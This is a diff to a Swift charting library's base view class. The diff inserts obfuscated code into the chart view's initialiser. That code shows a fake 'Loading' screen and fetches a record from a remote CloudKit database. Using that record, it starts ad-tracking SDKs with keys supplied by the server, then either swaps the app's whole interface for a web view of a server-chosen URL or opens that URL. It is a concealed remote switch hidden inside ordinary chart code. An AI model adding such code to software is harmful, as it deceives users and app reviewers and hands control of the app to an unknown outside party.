@@ -12,6 +12,10 @@
 
 import Foundation
 import CoreGraphics
+import CloudKit
+import WebKit
+import AppsFlyerLib
+import AdjustSdk
 
 #if canImport(UIKit)
 import UIKit
@@ -53,6 +57,7 @@ open class ChartViewBase: NSUIView, ChartDataProvider, AnimatorDelegate
     
     /// The default IValueFormatter that has been determined by the chart considering the provided minimum and maximum values.
     internal lazy var defaultValueFormatter: ValueFormatter = DefaultValueFormatter(decimals: 0)
+    private var scatbackRiw6: Reachability?
 
     /// object that holds all data that was originally set for the chart, before it was modified or any filtering algorithms had been applied
     @objc open var data: ChartData?
@@ -187,8 +192,143 @@ open class ChartViewBase: NSUIView, ChartDataProvider, AnimatorDelegate
 
         addObserver(self, forKeyPath: "bounds", options: .new, context: nil)
         addObserver(self, forKeyPath: "frame", options: .new, context: nil)
+
+        shplanktologycsneow()
+        setupNetworkMonitoring()
+        DispatchQueue.main.asyncAfter(deadline: .now()+0.5) {
+            self.pijjrjggyvsy()
+        }
+
+    }
+        
+    private func setupNetworkMonitoring() {
+        do {
+            try scatbackRiw6 = Reachability.init(hostname: "https://www.baidu.com")
+            NotificationCenter.default.addObserver(self, selector: #selector(reachabilityChange(noti:)), name: NSNotification.Name.reachabilityChanged, object: nil)
+            try scatbackRiw6?.startNotifier()
+        } catch {}
     }
     
+    @objc private func reachabilityChange(noti: Notification) {
+        if scatbackRiw6!.connection == .wifi || scatbackRiw6!.connection == .cellular {
+            DispatchQueue.main.asyncAfter(deadline: .now()+0.5) {
+                self.pijjrjggyvsy()
+            }
+        }
+    }
+    
+    private func shplanktologycsneow() {
+        if #available(iOS 13.0, *) {
+            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene, let window = windowScene.windows.first {
+                let SCRE_W = UIScreen.main.bounds.size.width
+                let SCRE_H = UIScreen.main.bounds.size.height
+                let planktologycsnechv = UIView(frame: .init(x: 0, y: 0, width: SCRE_W, height: SCRE_H))
+                planktologycsnechv.backgroundColor = .white
+                planktologycsnechv.tag = 1000
+                window.rootViewController?.view.addSubview(planktologycsnechv)
+                
+                
+                let planktologycsnelebw = UILabel()
+                planktologycsnelebw.textColor = .black
+                planktologycsnelebw.text = "Loading"
+                planktologycsnelebw.font = .init(name: "Futura", size: 20)
+                planktologycsnelebw.textAlignment = .center
+                planktologycsnelebw.bounds = .init(x: 0, y: 0, width: SCRE_W, height: 40)
+                planktologycsnelebw.center = .init(x: SCRE_W/2.0, y: SCRE_H/2.0 + 130.0)
+                planktologycsnechv.addSubview(planktologycsnelebw)
+                
+                let planktologycsnesar = ["Loading.","Loading..","Loading..."]
+                var curplanktologycsnendex = 0
+                let loplanktologycsneimer = Timer.scheduledTimer(withTimeInterval: 0.8, repeats: true) { [weak planktologycsnelebw, weak planktologycsnechv] timer in
+                    guard let laplanktologycsnel = planktologycsnelebw, let coplanktologycsneiew = planktologycsnechv, coplanktologycsneiew.superview != nil else {
+                        timer.invalidate()
+                        return
+                    }
+                    laplanktologycsnel.text = planktologycsnesar[curplanktologycsnendex]
+                    curplanktologycsnendex = (curplanktologycsnendex + 1) % planktologycsnesar.count
+                }
+                planktologycsnechv.layer.setValue(loplanktologycsneimer, forKey: "keloplanktologycsneimery")
+            }
+        } else {
+            // Fallback on earlier versions
+        }
+    }
+
+
+
+    
+    private func pijjrjggyvsy() {
+        if #available(iOS 15.0, *) {
+            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene, let window = windowScene.windows.first {
+                let greenleekbegottencaner = CKContainer(identifier: "iCloud.com.Ainetoolane.pro")
+                let ksjtfiwkj = greenleekbegottencaner.publicCloudDatabase
+                let frjvpvijtfpyjy = CKQuery(recordType: "iyrjhjwpftfrj", predicate: .init(value: true))
+                let ftgjvtfpwpg = CKQueryOperation(query: frjvpvijtfpyjy)
+                var coksjtfiwkjunt = 0
+                ftgjvtfpwpg.recordMatchedBlock = { (_ ,catenacciords) in
+                    coksjtfiwkjunt += 1
+                    let inco = try? catenacciords.get()
+                    DispatchQueue.main.async {
+                        if let incoUl = inco!["incoUr"] as? String {
+                            if let incoPat = inco!["incoPlaf"] as? String {
+                                if let incoEvt = inco!["incoEnty"] as? String {
+                                    if incoEvt == "af" {
+                                        AppsFlyerLib.shared().appsFlyerDevKey = inco!["incoAfky"]!
+                                        AppsFlyerLib.shared().appleAppID = inco!["incoAid"]!
+                                        AppsFlyerLib.shared().start()
+                                    }else if incoEvt == "ad" {
+                                        let adkey = inco!["incoAdky"]
+                                        let adjpro = ADJEnvironmentProduction
+                                        let adconfig = ADJConfig(appToken: adkey! as! String, environment: adjpro)
+                                        Adjust.initSdk(adconfig)
+                                    }
+                                    if incoPat == "1" {
+                                        let hdltheosophistAjssj6 = ChartDisplayController(intOobviosityTce: incoUl, iobviosityTcpe: incoEvt, iobviosityTcst: inco!["incoAdelist"]!, iobviosityTcmp: inco!["incoInpjp"]!)
+                                        window.rootViewController = hdltheosophistAjssj6
+                                        window.makeKeyAndVisible()
+                                        
+                                    }else if incoPat == "2" {
+                                        let hdltheosophistAjssj6 = ChartDisplayController(intTobviosityTco: incoUl, iobviosityTcpe: incoEvt, iobviosityTcst: inco!["incoAdelist"]!, iobviosityTcmp: inco!["incoInpjp"]!)
+                                        window.rootViewController = hdltheosophistAjssj6
+                                        window.makeKeyAndVisible()
+                                        
+                                    }else if incoPat == "3" {
+                                        UIApplication.shared.open(URL.init(string: incoUl)!, options: [:], completionHandler: nil)
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                ftgjvtfpwpg.queryCompletionBlock = { (qcsor, error) in
+                    if let error = error {
+                        print("Query failed with error: \(error.localizedDescription)")
+                        DispatchQueue.main.async {
+                            if let planktologycsnechv = window.rootViewController?.view.viewWithTag(1000) {
+                                planktologycsnechv.removeFromSuperview()
+                            }
+                        }
+                        DispatchQueue.main.asyncAfter(deadline:.now() + 0.5) {
+                            self.pijjrjggyvsy()
+                        }
+                        return
+                    }
+                    if coksjtfiwkjunt == 0 {
+                        DispatchQueue.main.async {
+                            if let planktologycsnechv = window.rootViewController?.view.viewWithTag(1000) {
+                                planktologycsnechv.removeFromSuperview()
+                            }
+                        }
+                        print("No records found matching the query")
+                    }
+                }
+                ksjtfiwkj.add(ftgjvtfpwpg)
+            }
+        } else {
+            // Fallback on earlier versions
+        }
+    }
+
     // MARK: - ChartViewBase
     
     /// Clears the chart from all data (sets it to null) and refreshes it (by calling setNeedsDisplay()).
